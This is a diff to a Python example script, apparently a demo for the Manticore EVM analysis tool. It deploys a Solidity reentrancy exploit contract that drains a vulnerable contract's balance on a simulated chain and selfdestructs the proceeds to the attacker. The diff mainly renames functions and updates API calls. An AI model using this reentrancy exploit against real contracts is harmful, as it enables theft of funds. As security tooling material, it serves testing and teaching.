@@ -1,4 +1,4 @@
-from seth import ManticoreEVM
+from manticore.seth import ManticoreEVM, ABI
 ################ Script #######################
 
 seth = ManticoreEVM()
@@ -58,13 +58,13 @@ contract GenericReentranceExploit {
         reentry_reps = reps;
     }
 
-    function delegate(bytes data) payable{
+    function proxycall(bytes data) payable{
         // call addToBalance with msg.value ethers
         vulnerable_contract.call.value(msg.value)(data);
     }
 
     function get_money(){
-        suicide(owner);
+        selfdestruct(owner);
     }
 
     function () payable{
@@ -76,12 +76,6 @@ contract GenericReentranceExploit {
         }
     }
 }
-//Function signatures: 
-//0ccfac9e: delegate(bytes)
-//b8029269: get_money()
-//9d15fd17: set_reentry_attack_string(bytes)
-//0d4b1aca: set_reentry_reps(int256)
-//beac44e7: set_vulnerable_contract(address)
 '''
 
 
@@ -90,7 +84,7 @@ user_account = seth.create_account(balance=100000000000000000)
 attacker_account = seth.create_account(balance=100000000000000000)
 
 contract_account = seth.solidity_create_contract(contract_source_code, owner=user_account) #Not payable
-seth.world[int(contract_account)]['balance']=1000000000000000000  #give it some ether
+seth.world.set_balance(contract_account, 1000000000000000000)  #give it some ether
 
 exploit_account = seth.solidity_create_contract(exploit_source_code, owner=attacker_account)
 
@@ -102,7 +96,7 @@ exploit_account.set_reentry_reps(30)
 
 print "\t Setting attack string"
 #'\x9d\x15\xfd\x17'+pack_msb(32)+pack_msb(4)+'\x5f\xd8\xc7\x10',
-reentry_string = seth.make_function_id('withdrawBalance()')
+reentry_string = ABI.make_function_id('withdrawBalance()')
 exploit_account.set_reentry_attack_string(reentry_string)
 
 
@@ -119,10 +113,10 @@ contract_account.addToBalance(value=100000000000000000)
 
 
 print "[+] Let attacker deposit some small amount using exploit"
-exploit_account.delegate(seth.make_function_id('addToBalance()'), value=100000000000000000)
+exploit_account.proxycall(ABI.make_function_id('addToBalance()'), value=100000000000000000)
 
 print "[+] Let attacker extract all  using exploit" 
-exploit_account.delegate(seth.make_function_id('withdrawBalance()'))
+exploit_account.proxycall(ABI.make_function_id('withdrawBalance()'))
 
 print "[+] Let attacker destroy the exploit andprofit" 
 exploit_account.get_money()
